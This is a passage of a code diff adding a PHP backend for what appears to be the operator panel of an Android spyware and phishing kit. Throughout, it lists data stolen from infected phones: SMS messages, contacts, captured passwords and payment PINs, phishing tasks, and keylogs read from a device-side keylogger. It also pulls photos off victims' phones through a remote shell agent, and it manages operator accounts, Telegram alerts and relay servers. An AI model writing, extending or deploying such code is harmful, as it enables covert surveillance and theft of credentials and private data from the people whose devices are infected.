+            $j = json_decode((string)$r['command_json'], true) ?: [];
+            $out[] = [
+                'id' => (string)($j['id'] ?? $r['id']),
+                'command' => (string)($j['command'] ?? ''),
+                'payload' => $j['params'] ?? null,
+                'picked' => !empty($r['picked_at']),
+                'created_at' => (int)($r['created_at'] ?? 0),
+            ];
+        }
+        return $this->json(['success' => true, 'data' => $out, 'items' => $out, 'total' => count($out)]);
+    }
+
+    protected function deviceSms(string $did)
+    {
+        $rows = Db::table('fisher_sms_messages')->where('device_id', $did)->order('id', 'desc')->limit(500)->select()->toArray();
+        return $this->json(array_map(function ($r) {
+            $addr = (string)($r['address'] ?? $r['phone'] ?? $r['sender'] ?? '');
+            $body = (string)($r['body'] ?? $r['content'] ?? '');
+            $ts   = (int)($r['timestamp'] ?? 0);
+            if ($ts <= 0) $ts = (int)($r['date'] ?? 0);
+            if ($ts > 0 && $ts < 100000000000) $ts = $ts * 1000;
+            if ($ts <= 0) $ts = (int)($r['created_at'] ?? 0) * 1000;
+            return [
+                'id'         => (int)$r['id'],
+                'device_id'  => (string)($r['device_id'] ?? ''),
+                'address'    => $addr,
+                'phone'      => $addr,
+                'body'       => $body,
+                'content'    => $body,
+                'type'       => (int)($r['type'] ?? 1),
+                'read'       => (bool)($r['read'] ?? 0),
+                'recv_at'    => $ts,
+                'timestamp'  => $ts,
+                'date'       => (string)($r['date'] ?? ''),
+                'created_at' => (int)($r['created_at'] ?? 0) * 1000,
+            ];
+        }, $rows));
+    }
+
+    protected function deviceContacts(string $did)
+    {
+        if ($this->method === 'DELETE') {
+            Db::table('fisher_contacts')->where('device_id', $did)->delete();
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        $rows = Db::table('fisher_contacts')->where('device_id', $did)->order('id', 'desc')->limit(2000)->select()->toArray();
+        return $this->json(array_map(function ($r) {
+            return [
+                'id' => (int)$r['id'],
+                'name' => (string)($r['name'] ?? ''),
+                'phone' => (string)($r['phone'] ?? ''),
+                'number' => (string)($r['phone'] ?? ''),
+                'email' => (string)($r['email'] ?? ''),
+                'created_at' => (int)($r['created_at'] ?? 0) * 1000,
+            ];
+        }, $rows));
+    }
+
+    protected function deviceApps(string $did)
+    {
+        $row = Db::table('fisher_device_apps')->where('device_id', $did)->find();
+        $apps = [];
+        if ($row && !empty($row['installed_apps'])) {
+            $d = json_decode((string)$row['installed_apps'], true);
+            if (is_array($d)) $apps = $d;
+        }
+        return $this->json($apps);
+    }
+
+    protected function deviceCredentials(string $did)
+    {
+        $rows = Db::table('fisher_passwords')->where('device_id', $did)->order('id', 'desc')->limit(500)->select()->toArray();
+        $out = [];
+        foreach ($rows as $r) {
+            $out[] = $this->credentialRow($r);
+        }
+        return $this->json($out);
+    }
+
+    protected function devicePwdIn(string $did, $arg)
+    {
+        if ($arg !== null && $this->method === 'DELETE') {
+            Db::table('fisher_password_inputs')->where('id', (int)$arg)->where('device_id', $did)->delete();
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        if ($this->method === 'DELETE') {
+            Db::table('fisher_password_inputs')->where('device_id', $did)->delete();
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        $page = max(1, (int)($this->query['page'] ?? 1));
+        $size = (int)($this->query['pageSize'] ?? $this->query['page_size'] ?? 20);
+        if ($size < 1) $size = 20;
+        if ($size > 200) $size = 200;
+
+        $q = Db::table('fisher_password_inputs')->where('device_id', $did);
+        $total = (int)$q->count();
+        $rows = [];
+        if ($total > 0) {
+            $rows = $q->order('id', 'desc')->page($page, $size)->select()->toArray();
+        } else {
+            $rows = Db::table('fisher_passwords')->where('device_id', $did)->order('id', 'desc')->page($page, $size)->select()->toArray();
+            $total = (int)Db::table('fisher_passwords')->where('device_id', $did)->count();
+        }
+        $list = [];
+        foreach ($rows as $r) {
+            $list[] = [
+                'id'           => (int)$r['id'],
+                'text'         => (string)($r['password'] ?? $r['cipher_text'] ?? ''),
+                'password'     => (string)($r['password'] ?? $r['cipher_text'] ?? ''),
+                'type'         => (string)($r['type'] ?? $r['cipher_type'] ?? 'text'),
+                'cipher_type'  => (string)($r['cipher_type'] ?? 'text'),
+                'source'       => (string)($r['source'] ?? 'capture'),
+                'package_name' => (string)($r['package_name'] ?? ''),
+                'app_name'     => (string)($r['app_name'] ?? ''),
+                'grade_code'   => (string)($r['grade_code'] ?? ''),
+                'captured_at'  => (int)($r['captured_at'] ?? $r['created_at'] ?? 0) * 1000,
+            ];
+        }
+        return $this->json([
+            'success' => true,
+            'data' => ['passwords' => $list, 'page' => $page, 'pageSize' => $size, 'total' => $total],
+            'passwords' => $list,
+            'total' => $total,
+            'page' => $page,
+        ]);
+    }
+
+    protected function deviceLogs(string $did)
+    {
+        $type = trim((string)($this->query['log_type'] ?? ''));
+        if ($this->method === 'DELETE') {
+            $q1 = Db::table('fisher_operation_logs')->where('device_id', $did);
+            $q2 = Db::table('fisher_bridge_logs')->where('device_id', $did);
+            if ($type !== '') { $q1 = $q1->where('log_type', $type); $q2 = $q2->where('log_type', $type); }
+            $q1->delete();
+            $q2->delete();
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        $q1 = Db::table('fisher_operation_logs')->where('device_id', $did);
+        if ($type !== '') $q1 = $q1->where('log_type', $type);
+        $a = $q1->order('id', 'desc')->limit(1500)->select()->toArray();
+        $q2 = Db::table('fisher_bridge_logs')->where('device_id', $did);
+        if ($type !== '') $q2 = $q2->where('log_type', $type);
+        $b = $q2->order('id', 'desc')->limit(500)->select()->toArray();
+        $all = array_merge($a, $b);
+        usort($all, function ($x, $y) { return ((int)$y['timestamp'] <=> (int)$x['timestamp']); });
+        $out = [];
+        foreach (array_slice($all, 0, 1000) as $r) {
+            $out[] = $this->logRow($did, $r);
+        }
+        if (!$out) {
+            // 键盘日志 tab: nothing stored yet -> read the live getevent capture the
+            // device-side keylogger writes (dxs /readFile). Empty until real
+            // /dev/input key events happen, which is the honest state (2026-10-09).
+            $out = $this->deviceKeylogFromFile($did);
+        }
+        return $this->json($out);
+    }
+
+    /** Parse /data/local/tmp/getevent_capture.txt into panel keylog rows. */
+    protected function deviceKeylogFromFile(string $did): array
+    {
+        $file = '/data/local/tmp/getevent_capture.txt';
+        $r = $this->dxsHttp('GET', '/readFile?path=' . str_replace('%2F', '/', rawurlencode($file)), null, 12000);
+        if (!$r || !isset($r['data']['content']) || !is_string($r['data']['content'])) return [];
+        $txt = $r['data']['content'];
+        if (trim($txt) === '') return [];
+        $out = [];
+        $n = 0;
+        foreach (preg_split('/\r?\n/', $txt) as $line) {
+            $line = trim($line);
+            if ($line === '') continue;
+            $key = '';
+            $up = false;
+            $ts = 0;
+            if (preg_match('/^\[\s*([\d.]+)\]\s+EV_KEY\s+(\S+)\s+(DOWN|UP|REPEAT)/i', $line, $m)) {
+                $ts = (int)((float)$m[1] * 1000);
+                $key = $m[2];
+                $up = strtoupper($m[3]) === 'UP';
+            } elseif (preg_match('/^\[\s*([\d.]+)\]\s+(\S+):\s+value\s+(\d+)/i', $line, $m)) {
+                $ts = (int)((float)$m[1] * 1000);
+                $key = $m[2];
+                $up = $m[3] === '0';
+            } elseif (preg_match('/^([0-9a-f]{4})\s+([0-9a-f]{4})\s+([0-9a-f]{8})$/i', $line, $m)) {
+                if (hexdec($m[1]) !== 1) continue;
+                $key = 'KEY_' . hexdec($m[2]);
+                $up = hexdec($m[3]) === 0;
+            } else {
+                continue;
+            }
+            if (!$up || $key === '') continue;
+            $n++;
+            $out[] = [
+                'id'         => $n,
+                'device_id'  => $did,
+                'log_type'   => 'keylog',
+                'logType'    => 'keylog',
+                'text'       => $key,
+                'content'    => $key,
+                'app_pkg'    => '',
+                'app_name'   => '',
+                'action'     => '',
+                'time'       => $ts,
+                'timestamp'  => $ts,
+            ];
+        }
+        return array_slice(array_reverse($out), 0, 500);
+    }
+
+    protected function logRow(string $did, array $r): array
+    {
+        $content = (string)($r['content'] ?? '');
+        $appPkg = '';
+        $action = '';
+        $text = $content;
+        if (strpos($content, '|') !== false) {
+            $p = explode('|', $content);
+            if (count($p) >= 3) {
+                $appPkg = trim($p[0]);
+                $action = trim($p[1]);
+                $text = trim(implode('|', array_slice($p, 2)));
+            } elseif (count($p) === 2) {
+                $appPkg = trim($p[0]);
+                $text = trim($p[1]);
+            }
+        }
+        $ts = (int)($r['timestamp'] ?? 0);
+        if ($ts <= 0) $ts = (int)($r['created_at'] ?? 0);
+        return [
+            'id'         => (int)$r['id'],
+            'device_id'  => $did,
+            'log_type'   => (string)($r['log_type'] ?? 'INFO'),
+            'logType'    => (string)($r['log_type'] ?? 'INFO'),
+            'text'       => $text,
+            'content'    => $content,
+            'app_pkg'    => $appPkg,
+            'app_name'   => $appPkg,
+            'action'     => $action,
+            'time'       => $ts * 1000,
+            'timestamp'  => $ts * 1000,
+        ];
+    }
+
+    protected function deviceAlbum(string $did, $arg)
+    {
+        if (strpos($this->path, '/album/thumb/') !== false) {
+            $rest = substr($this->path, strpos($this->path, '/album/thumb/') + 13);
+            return $this->albumThumb($rest);
+        }
+        if ($this->method === 'DELETE') return $this->json(['success' => true, 'data' => null]);
+        $page = max(1, (int)($this->query['page'] ?? 1));
+        $size = (int)($this->query['size'] ?? 40);
+        if ($size < 1) $size = 40;
+        if ($size > 200) $size = 200;
+        $items = $this->albumScan($did);
+        $total = count($items);
+        $slice = array_slice($items, ($page - 1) * $size, $size);
+        return $this->json(['items' => array_values($slice), 'total' => $total, 'page' => $page, 'size' => $size]);
+    }
+
+    /** Live device gallery listing pulled from the dxs agent (GET /listDir). */
+    protected static $albumCache = [];
+
+    protected function albumScan(string $did, bool $force = false): array
+    {
+        $now = time();
+        if (!$force && isset(self::$albumCache[$did]) && ($now - self::$albumCache[$did]['t']) < 12) {
+            return self::$albumCache[$did]['v'];
+        }
+        $dirs = ['/sdcard/DCIM/Camera', '/sdcard/DCIM', '/sdcard/Pictures', '/sdcard/Pictures/Screenshots', '/sdcard/Download', '/sdcard/Movies'];
+        $out = [];
+        $seen = [];
+        foreach ($dirs as $dir) {
+            foreach ($this->albumListDir($dir) as $f) {
+                if (!empty($f['isDirectory'])) {
+                    if (!empty($f['isLink'])) continue;
+                    if (strpos((string)$f['name'], '.') === 0) continue;
+                    foreach ($this->albumListDir($f['path']) as $sub) {
+                        if (!empty($sub['isDirectory']) || isset($seen[$sub['path']])) continue;
+                        if (!$this->albumIsImage((string)$sub['name'])) continue;
+                        $seen[$sub['path']] = true;
+                        $out[] = $this->albumItem($did, $sub);
+                    }
+                } else {
+                    if (strpos((string)$f['name'], '.') === 0) continue;
+                    if (isset($seen[$f['path']]) || !$this->albumIsImage((string)$f['name'])) continue;
+                    $seen[$f['path']] = true;
+                    $out[] = $this->albumItem($did, $f);
+                }
+            }
+        }
+        self::$albumCache[$did] = ['t' => $now, 'v' => $out];
+        return $out;
+    }
+
+    protected function albumItem(string $did, array $f): array
+    {
+        $name = (string)$f['name'];
+        $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
+        $mime = 'image/jpeg';
+        if ($ext === 'png') $mime = 'image/png';
+        elseif ($ext === 'gif') $mime = 'image/gif';
+        elseif ($ext === 'webp') $mime = 'image/webp';
+        elseif ($ext === 'bmp') $mime = 'image/bmp';
+        $ts = (int)($f['lastModified'] ?? 0);
+        if ($ts > 0 && $ts < 100000000000) $ts = $ts * 1000;
+        return [
+            'id'           => $this->b64urlEncode((string)$f['path']),
+            'device_id'    => $did,
+            'content_uri'  => (string)$f['path'],
+            'display_name' => $name,
+            'file_name'    => $name,
+            'path'         => (string)$f['path'],
+            'size'         => (int)($f['size'] ?? 0),
+            'mime_type'    => $mime,
+            'is_video'     => false,
+            'created_at'   => $ts,
+            'updated_at'   => $ts,
+            'timestamp'    => $ts,
+        ];
+    }
+
+    protected function albumIsImage(string $name): bool
+    {
+        return (bool)preg_match('/\.(jpe?g|png|gif|webp|bmp|heic)$/i', $name);
+    }
+
+    protected function albumListDir(string $dir): array
+    {
+        $r = $this->dxsHttp('GET', '/listDir?path=' . str_replace('%2F', '/', rawurlencode($dir)), null, 8000);
+        if (!$r || empty($r['data']['list']) || !is_string($r['data']['list'])) return [];
+        $out = [];
+        foreach (explode("\n", $r['data']['list']) as $line) {
+            $line = rtrim($line, "\r");
+            if ($line === '' || stripos($line, 'total ') === 0) continue;
+            if (!preg_match('/^([bcdlps-][rwxsStT-]{9}[.+@]?)\s+(\d+)\s+(\S+)\s+(\S+)\s+(\d+)\s+(\S+)\s+(\S+)\s+(.+)$/', $line, $m)) continue;
+            $name = $m[8];
+            $target = null;
+            $arrow = strpos($name, ' -> ');
+            if ($arrow !== false) { $target = substr($name, $arrow + 4); $name = substr($name, 0, $arrow); }
+            if ($name === '.' || $name === '..') continue;
+            $isLink = $m[1][0] === 'l';
+            $isDir = $m[1][0] === 'd';
+            if ($isLink && $target !== null) $isDir = substr($target, -1) === '/';
+            $d1 = $m[6]; $d2 = $m[7];
+            $ts = 0;
+            if (preg_match('/^\d{4}-\d{2}-\d{2}$/', $d1)) $ts = (int)strtotime($d1 . ' ' . $d2);
+            else $ts = (int)strtotime($d1 . ' ' . $d2 . ' ' . (preg_match('/^\d{4}$/', $d2) ? '' : date('Y')));
+            $out[] = [
+                'name'         => $name,
+                'isDirectory'  => $isDir,
+                'isLink'       => $isLink,
+                'size'         => (int)$m[5],
+                'lastModified' => $ts * 1000,
+                'path'         => rtrim($dir, '/') . '/' . $name,
+            ];
+        }
+        return $out;
+    }
+
+    /** Real thumbnail: pull the bytes off the device through dxs /execShell base64. */
+    protected function albumThumb(string $id)
+    {
+        $raw = $this->b64urlDecode($id);
+        if ($raw === '') return $this->placeholderImage();
+        $dir = dirname(__DIR__, 2) . DIRECTORY_SEPARATOR . 'public' . DIRECTORY_SEPARATOR . 'storage' . DIRECTORY_SEPARATOR . 'album_thumbs';
+        $cacheFile = $dir . DIRECTORY_SEPARATOR . md5($raw) . '.bin';
+        $metaFile = $cacheFile . '.json';
+        if (is_file($cacheFile)) {
+            $mime = 'image/jpeg';
+            if (is_file($metaFile)) {
+                $m = json_decode((string)@file_get_contents($metaFile), true);
+                if (is_array($m) && !empty($m['mime'])) $mime = (string)$m['mime'];
+            }
+            return response((string)file_get_contents($cacheFile), 200, ['Content-Type' => $mime, 'Cache-Control' => 'public, max-age=600']);
+        }
+        $size = 0;
+        $st = $this->dxsShell('stat -c %s ' . $this->shqPhp($raw));
+        if ($st && isset($st['data']['output'])) $size = (int)trim((string)$st['data']['output']);
+        if ($size > 8 * 1024 * 1024) return $this->placeholderImage();
+        $r = $this->dxsShell('base64 -w0 ' . $this->shqPhp($raw));
+        $b64 = $r && isset($r['data']['output']) ? (string)$r['data']['output'] : '';
+        $b64 = (string)preg_replace('/\s+/', '', $b64);
+        if ($b64 === '') return $this->placeholderImage();
+        $bin = base64_decode($b64, true);
+        if ($bin === false || $bin === '') return $this->placeholderImage();
+        $ext = strtolower(pathinfo($raw, PATHINFO_EXTENSION));
+        $mime = 'image/jpeg';
+        if ($ext === 'png') $mime = 'image/png';
+        elseif ($ext === 'gif') $mime = 'image/gif';
+        elseif ($ext === 'webp') $mime = 'image/webp';
+        elseif ($ext === 'bmp') $mime = 'image/bmp';
+        try {
+            if (!is_dir($dir)) @mkdir($dir, 0777, true);
+            @file_put_contents($cacheFile, $bin);
+            @file_put_contents($metaFile, json_encode(['mime' => $mime, 'path' => $raw]));
+        } catch (\Throwable $e) {}
+        return response($bin, 200, ['Content-Type' => $mime, 'Cache-Control' => 'public, max-age=600']);
+    }
+
+    /** File-manager download: node-ws stages the pulled bytes under public/storage/downloads. */
+    protected function deviceDownloadFile(string $did)
+    {
+        $rid = (string)($this->query['requestId'] ?? '');
+        if ($rid === '' || !preg_match('/^[A-Za-z0-9._-]{1,80}$/', $rid)) {
+            return $this->json(['success' => false, 'error' => 'bad requestId'], 400);
+        }
+        $dir = dirname(__DIR__, 2) . DIRECTORY_SEPARATOR . 'public' . DIRECTORY_SEPARATOR . 'storage' . DIRECTORY_SEPARATOR . 'downloads';
+        $file = $dir . DIRECTORY_SEPARATOR . $rid;
+        if (!is_file($file)) return $this->json(['success' => false, 'error' => 'file not ready'], 404);
+        $name = $rid;
+        $meta = $dir . DIRECTORY_SEPARATOR . $rid . '.json';
+        if (is_file($meta)) {
+            $m = json_decode((string)@file_get_contents($meta), true);
+            if (is_array($m) && !empty($m['name'])) $name = (string)$m['name'];
+        }
+        $bytes = (string)file_get_contents($file);
+        return response($bytes, 200, [
+            'Content-Type'        => 'application/octet-stream',
+            'Content-Disposition' => 'attachment; filename="' . str_replace('"', '', $name) . '"',
+            'Content-Length'      => (string)strlen($bytes),
+            'Cache-Control'       => 'no-store',
+        ]);
+    }
+
+    protected function shqPhp(string $s): string
+    {
+        return "'" . str_replace("'", "'\\''", $s) . "'";
+    }
+
+    protected function b64urlEncode(string $s): string
+    {
+        return rtrim(strtr(base64_encode($s), '+/', '-_'), '=');
+    }
+
+    protected function b64urlDecode(string $s): string
+    {
+        $s = strtr($s, '-_', '+/');
+        $pad = strlen($s) % 4;
+        if ($pad) $s .= str_repeat('=', 4 - $pad);
+        $d = base64_decode($s, true);
+        return $d === false ? '' : $d;
+    }
+
+    protected function placeholderImage()
+    {
+        $png = base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==');
+        return response($png, 200, ['Content-Type' => 'image/png', 'Cache-Control' => 'public, max-age=86400']);
+    }
+
+    protected function devicePayrec(string $did)
+    {
+        if ($this->method === 'DELETE') {
+            Db::table('fisher_payment_cipher_records')->where('device_id', $did)->delete();
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        $rows = Db::table('fisher_payment_cipher_records')->where('device_id', $did)->order('id', 'desc')->limit(500)->select()->toArray();
+        return $this->json(array_map([$this, 'payrecRow'], $rows));
+    }
+
+    protected function payrecRow(array $r): array
+    {
+        $ts = (int)($r['created_at'] ?? 0);
+        if ($ts > 0 && $ts < 100000000000) $ts = $ts * 1000;
+        return [
+            'id'           => (int)$r['id'],
+            'device_id'    => (string)($r['device_id'] ?? ''),
+            'package_name' => (string)($r['package_name'] ?? ''),
+            'app_name'     => (string)($r['app_name'] ?? ''),
+            'cipher_text'  => (string)($r['cipher_text'] ?? ''),
+            'password'     => (string)($r['cipher_text'] ?? ''),
+            'cipher_type'  => (string)($r['cipher_type'] ?? 'pin'),
+            'type'         => (string)($r['cipher_type'] ?? 'pin'),
+            'source'       => (string)($r['source'] ?? ''),
+            'capt_at'      => $ts,
+            'created_at'   => $ts,
+        ];
+    }
+
+    protected function devicePhish(string $did, array $seg)
+    {
+        $tid = (string)($seg[3] ?? '');
+        $act = (string)($seg[4] ?? '');
+        if ($act === 'action' && $this->method === 'POST') {
+            $status = (string)($this->body['status'] ?? 'processing');
+            if ($tid !== '') Db::table('fisher_phish_tasks')->where('id', (int)$tid)->update(['status' => $status, 'updated_at' => time()]);
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        if ($act === 'remark' && ($this->method === 'PUT' || $this->method === 'POST')) {
+            $rm = (string)($this->body['remark'] ?? '');
+            if ($tid !== '') Db::table('fisher_phish_tasks')->where('id', (int)$tid)->update(['remark' => $rm, 'updated_at' => time()]);
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        if ($this->method === 'DELETE') {
+            Db::table('fisher_phish_tasks')->where('device_id', $did)->delete();
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        $rows = Db::table('fisher_phish_tasks')->where('device_id', $did)->order('id', 'desc')->limit(300)->select()->toArray();
+        return $this->json(array_map([$this, 'phishRow'], $rows));
+    }
+
+    // ================= users / groups =================
+    protected function groups()
+    {
+        $rows = Db::table('fisher_device_groups')->order('id', 'asc')->select()->toArray();
+        $out = [];
+        foreach ($rows as $r) {
+            $out[] = [
+                'id' => (int)$r['id'],
+                'name' => (string)$r['name'],
+                'group_name' => (string)$r['name'],
+                'device_count' => (int)Db::table('fisher_devices')->where('group_name', $r['name'])->count(),
+                'created_at' => $this->ts($r['created_at'] ?? 0),
+            ];
+        }
+        return $this->json($out);
+    }
+
+    protected function groupItem($id)
+    {
+        if ($id === null) {
+            if ($this->method !== 'POST' && $this->method !== 'PUT') {
+                return $this->json(['success' => true, 'data' => null]);
+            }
+            $name = trim((string)($this->body['name'] ?? $this->body['group_name'] ?? ''));
+            if ($name !== '') {
+                try { Db::table('fisher_device_groups')->insert(['name' => $name, 'created_at' => time()]); } catch (\Throwable $e) {}
+            }
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        if ($this->method === 'DELETE') {
+            Db::table('fisher_device_groups')->where('id', (int)$id)->delete();
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        if ($this->method === 'PUT' || $this->method === 'POST') {
+            $old = Db::table('fisher_device_groups')->where('id', (int)$id)->find();
+            $name = trim((string)($this->body['name'] ?? ''));
+            if ($old && $name !== '') {
+                Db::table('fisher_device_groups')->where('id', (int)$id)->update(['name' => $name]);
+                Db::table('fisher_devices')->where('group_name', $old['name'])->update(['group_name' => $name]);
+            }
+        }
+        return $this->json(['success' => true, 'data' => null]);
+    }
+
+    protected function users()
+    {
+        $rows = Db::table('fisher_users')->order('id', 'asc')->select()->toArray();
+        $out = [];
+        foreach ($rows as $r) {
+            $perms = $r['permissions'] ?? null;
+            if (is_string($perms)) { $d = json_decode($perms, true); $perms = is_array($d) ? $d : []; }
+            $out[] = [
+                'id' => (int)$r['id'],
+                'username' => (string)$r['username'],
+                'role' => (string)$r['role'],
+                'permissions' => $perms ?: [],
+                'enabled' => (bool)($r['enabled'] ?? 1),
+                'expire_at' => (int)($r['expire_at'] ?? 0),
+                'expire_at_str' => $this->ts($r['expire_at'] ?? 0),
+                'expires_at' => $this->ts($r['expire_at'] ?? 0),
+                'max_devices' => (int)($r['max_devices'] ?? 0),
+                'device_count' => (int)Db::table('fisher_devices')->where('owner_username', $r['username'])->count(),
+                'created_at' => $this->ts($r['created_at'] ?? 0),
+                'avatar' => (string)($r['avatar'] ?? ''),
+                'tg_bind' => false,
+                'tg_bound' => false,
+            ];
+        }
+        return $this->json($out);
+    }
+
+    protected function userItem(array $seg)
+    {
+        $id = (int)($seg[1] ?? 0);
+        $sub = (string)($seg[2] ?? '');
+        if ($this->method === 'POST' && $id === 0) {
+            $name = trim((string)($this->body['username'] ?? ''));
+            $pass = (string)($this->body['password'] ?? '');
+            if ($name === '' || $pass === '') return $this->json(['success' => false, 'error' => '用户名和密码不能为空'], 400);
+            if (Db::table('fisher_users')->where('username', $name)->find()) return $this->json(['success' => false, 'error' => '用户名已存在'], 409);
+            Db::table('fisher_users')->insert([
+                'username' => $name,
+                'password_hash' => password_hash($pass, PASSWORD_BCRYPT),
+                'role' => (string)($this->body['role'] ?? 'user'),
+                'max_devices' => (int)($this->body['max_devices'] ?? 100),
+                'enabled' => 1,
+                'expire_at' => (int)($this->body['expire_at'] ?? 0),
+                'created_at' => time(),
+            ]);
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        if ($id === 0) return $this->json(['success' => true, 'data' => null]);
+        $u = Db::table('fisher_users')->where('id', $id)->find();
+        if (!$u) return $this->json(['success' => false, 'error' => '用户不存在'], 404);
+
+        if ($this->method === 'DELETE') {
+            if ((int)$u['id'] === (int)$this->user['id']) return $this->json(['success' => false, 'error' => '不能删除当前登录账号'], 400);
+            Db::table('fisher_users')->where('id', $id)->delete();
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        if ($this->method === 'PUT' || $this->method === 'POST') {
+            $upd = [];
+            if ($sub === 'password') {
+                $p = (string)($this->body['password'] ?? $this->body['new_password'] ?? '');
+                if ($p !== '') $upd['password_hash'] = password_hash($p, PASSWORD_BCRYPT);
+            } elseif ($sub === 'username') {
+                $n = trim((string)($this->body['username'] ?? ''));
+                if ($n !== '') $upd['username'] = $n;
+            } elseif ($sub === 'expiry') {
+                $e = $this->body['expire_at'] ?? $this->body['expiry'] ?? null;
+                $upd['expire_at'] = $e === null ? 0 : (int)$e;
+            } elseif ($sub === 'remark') {
+                $upd['remark'] = (string)($this->body['remark'] ?? '');
+            } elseif ($sub === 'tg-bind') {
+                $upd['parent_username'] = (string)($this->body['tg_user'] ?? '');
+            }
+            if (empty($upd)) {
+                foreach (['role', 'enabled', 'max_devices', 'permissions'] as $k) {
+                    if (array_key_exists($k, $this->body)) {
+                        $upd[$k] = $k === 'permissions' ? (is_array($this->body[$k]) ? json_encode($this->body[$k]) : (string)$this->body[$k]) : $this->body[$k];
+                    }
+                }
+            }
+            if ($upd) {
+                try { Db::table('fisher_users')->where('id', $id)->update($upd); } catch (\Throwable $e) {
+                    error_log('[m-adapter] user update failed: ' . $e->getMessage());
+                }
+            }
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        return $this->json(['success' => true, 'data' => [
+            'id' => (int)$u['id'], 'username' => (string)$u['username'], 'role' => (string)$u['role'],
+            'enabled' => (bool)($u['enabled'] ?? 1), 'expire_at' => (int)($u['expire_at'] ?? 0),
+        ]]);
+    }
+
+    // ================= locale / telegram =================
+    protected function locale()
+    {
+        if ($this->method === 'POST' || $this->method === 'PUT') {
+            $content = $this->body['content'] ?? '';
+            if (is_array($content)) $content = json_encode($content, JSON_UNESCAPED_UNICODE);
+            $this->settingPut('locale', (string)$content);
+            if (isset($this->body['version'])) $this->settingPut('locale_version', (string)$this->body['version']);
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        $v = Db::table('fisher_settings')->where('key', 'locale')->value('value');
+        $ver = Db::table('fisher_settings')->where('key', 'locale_version')->value('value');
+        return $this->json(['content' => (string)($v ?? '{}'), 'version' => (int)($ver ?: 1), 'success' => true]);
+    }
+
+    protected function tg(array $seg)
+    {
+        $sub = (string)($seg[1] ?? '');
+        if ($sub === 'config' || $sub === '') {
+            if (($this->method === 'POST' || $this->method === 'PUT') && $sub === 'config') {
+                $keys = ['enabled', 'bot_token', 'chat_id', 'proxy', 'notify_new_device', 'notify_sms'];
+                $data = [];
+                foreach ($keys as $k) if (array_key_exists($k, $this->body)) $data[$k] = $this->body[$k];
+                $this->settingPut('tg_config', json_encode($data, JSON_UNESCAPED_UNICODE));
+                return $this->json(['success' => true, 'data' => $data]);
+            }
+            $raw = Db::table('fisher_settings')->where('key', 'tg_config')->value('value');
+            $cfg = json_decode((string)$raw, true);
+            if (!is_array($cfg)) $cfg = [];
+            $cfg += ['enabled' => false, 'bot_token' => '', 'chat_id' => '', 'proxy' => '', 'notify_new_device' => true, 'notify_sms' => true];
+            if ($sub === 'config') return $this->json($cfg);
+            return $this->json(['success' => true, 'data' => $cfg, 'config' => $cfg]);
+        }
+        if ($sub === 'status') {
+            $raw = Db::table('fisher_settings')->where('key', 'tg_config')->value('value');
+            $cfg = json_decode((string)$raw, true) ?: [];
+            return $this->json([
+                'bound'    => !empty($cfg['chat_id']),
+                'enabled'  => !empty($cfg['enabled']),
+                'chat_id'  => (string)($cfg['chat_id'] ?? ''),
+                'username' => (string)($cfg['username'] ?? ''),
+                'bot_token_set' => !empty($cfg['bot_token']),
+            ]);
+        }
+        return $this->json(['success' => true, 'data' => null]);
+    }
+
+    protected function telegram(array $seg)
+    {
+        $sub = (string)($seg[1] ?? '');
+        $raw = Db::table('fisher_settings')->where('key', 'tg_config')->value('value');
+        $cfg = json_decode((string)$raw, true) ?: [];
+        if ($sub === 'bind-request') {
+            $this->settingPut('tg_bind_code', (string)random_int(100000, 999999));
+            return $this->json(['success' => true, 'code' => Db::table('fisher_settings')->where('key', 'tg_bind_code')->value('value'), 'data' => null]);
+        }
+        if ($sub === 'bind-confirm') {
+            $cfg['chat_id'] = (string)($this->body['chat_id'] ?? $this->body['chatId'] ?? '');
+            $this->settingPut('tg_config', json_encode($cfg, JSON_UNESCAPED_UNICODE));
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        if ($sub === 'unbind') {
+            $cfg['chat_id'] = '';
+            $this->settingPut('tg_config', json_encode($cfg, JSON_UNESCAPED_UNICODE));
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        return $this->json(['success' => true, 'data' => null]);
+    }
+
+    // ================= turn nodes =================
+    protected function turnNodes($id = null)
+    {
+        if ($id !== null && $this->method === 'DELETE') {
+            Db::table('fisher_turn_nodes')->where('id', (int)$id)->delete();
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        if ($this->method === 'POST') {
+            $b = $this->body;
+            $row = [
+                'name' => (string)($b['name'] ?? ''),
+                'host' => (string)($b['host'] ?? $b['server'] ?? ''),
+                'port' => (int)($b['port'] ?? 3478),
+                'username' => (string)($b['username'] ?? ''),
+                'password' => (string)($b['password'] ?? ''),
+                'realm' => (string)($b['realm'] ?? ''),
+                'region' => (string)($b['region'] ?? ''),
+                'enabled' => !empty($b['enabled']) ? 1 : 0,
+                'created_at' => time(),
+            ];
+            if (!empty($b['id'])) Db::table('fisher_turn_nodes')->where('id', (int)$b['id'])->update($row);
+            else Db::table('fisher_turn_nodes')->insert($row);
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        $rows = Db::table('fisher_turn_nodes')->order('id', 'asc')->select()->toArray();
+        $out = [];
+        foreach ($rows as $r) {
+            $r['id'] = (int)$r['id'];
+            $r['port'] = (int)$r['port'];
+            $r['enabled'] = (bool)$r['enabled'];
+            $r['success_rate'] = (int)($r['success_rate'] ?? 100);
+            $r['fail_rate'] = (int)($r['fail_rate'] ?? 0);
+            $r['status'] = $r['enabled'] ? 'ok' : 'disabled';
+            $out[] = $r;
+        }
+        return $this->json($out);
+    }
+
+    protected function turnNode(array $seg)
+    {
+        $id = (int)($seg[1] ?? 0);
+        if ($this->method === 'DELETE') {
+            Db::table('fisher_turn_nodes')->where('id', $id)->delete();
